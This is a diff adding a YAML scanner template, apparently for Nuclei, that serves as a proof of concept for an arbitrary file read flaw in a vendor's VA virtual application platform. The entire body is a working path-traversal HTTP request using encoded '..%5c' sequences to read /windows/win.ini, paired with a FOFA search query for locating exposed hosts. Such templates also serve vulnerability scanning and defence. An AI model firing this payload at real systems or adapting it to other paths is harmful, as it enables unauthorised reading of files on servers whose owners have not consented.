@@ -1,0 +1,32 @@
+id: poc-kar0ci0n76z0zlsd
+info:
+  name: 霆智科技-VA虚拟应用平台存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kar0ci0n76z0zlsd'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kar0ci0n76z0zlsd
+    fofa: body="EAA益和应用接入系统"
+http:
+- raw:
+  - 'POST /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip
+
+    Content-Length: 2
+
+
+    {}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
